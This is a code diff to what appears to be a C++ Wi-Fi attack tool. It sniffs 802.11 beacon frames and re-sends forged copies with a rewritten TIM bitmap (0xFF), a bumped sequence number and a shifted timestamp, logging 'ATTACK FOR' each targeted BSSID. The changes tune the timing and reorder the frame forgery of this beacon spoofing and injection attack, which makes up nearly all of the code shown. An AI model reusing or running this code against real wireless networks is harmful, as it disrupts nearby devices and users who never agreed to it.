@@ -74,7 +74,8 @@ int main(int argc, char* argv[]) {
 			continue;
 		}
 		if (len != sizeof(RadiotapHdr) && len != 18 && len != 13) {
-			GTRACE("too big radiotap header len %u %p %p\n", len, (void*)radiotapHdr, (void*)end);
+			GTRACE("invalid radiotap header len %u %p %p\n", len, (void*)radiotapHdr, (void*)end);
+			continue;
 		}
 		if (len == sizeof(RadiotapHdr) || len == 13) continue;
 		BeaconHdr* beaconHdr = PBeaconHdr(packet + radiotapHdr->len_);
@@ -104,11 +105,19 @@ int main(int argc, char* argv[]) {
 					Clock last = it->second;
 					Diff diff = now - last;
 					//GTRACE("diff=%lu\n", diff.count());
-					if (diff.count() < 1000000000) // 1 sec
+					if (diff.count() < 3000000000) // 3 sec
 						attack = false;
 				}
 				if (attack) {
 					GTRACE("ATTACK FOR %s\n", std::string(bssid).c_str());
+
+					le16_t seq = beaconHdr->seq_;
+					le64_t timestamp = beaconHdr->fixed_.timestamp_;
+					beaconHdr->seq_ = seq + 1;
+					static __useconds_t timstampIncment = 100000; // 100 msec
+					beaconHdr->fixed_.timestamp_ = timestamp + le64_t(timstampIncment); // gilgil temp
+					tim->bitmap_ = 0xFF;
+
 					char sendBuf[65536];
 					RadiotapHdr* sendRadiotapHdr = (RadiotapHdr*)sendBuf;
 					sendRadiotapHdr->len_ = sizeof(RadiotapHdr);
@@ -121,20 +130,14 @@ int main(int argc, char* argv[]) {
 					memcpy(sendBeaconHdr, beaconHdr, copyLen);
 					uint32_t writeLen = sizeof(RadiotapHdr) + copyLen;
 
-					le16_t seq = beaconHdr->seq_;
-					le64_t timestamp = beaconHdr->fixed_.timestamp_;
-					beaconHdr->seq_ = seq + 1;
-					static __useconds_t timstampIncment = 100000; // 100 msec
-					beaconHdr->fixed_.timestamp_ = timestamp + le64_t(timstampIncment); // gilgil temp
-					tim->bitmap_ = 0xFF;
 					usleep(timstampIncment - 10000); // -10 msec
-					for (int i = 0; i < 100; i++) {
-						beaconHdr->fixed_.timestamp_ = timestamp + 1000; // gilgil temp
+					for (int i = 0; i < 10; i++) {
+						sendBeaconHdr->fixed_.timestamp_ += 1000; // +1 msec
 						int res = pcap_sendpacket(handle, (const u_char*)sendBuf, writeLen);
 						if (res != 0) {
 							fprintf(stderr, "pacp_sendpacket return %d - %s\n", res, pcap_geterr(handle));
 						}
-						usleep(100); // 0.1 msec
+						usleep(1000); // 1 msec
 					}
 					it->second = now;
 				}
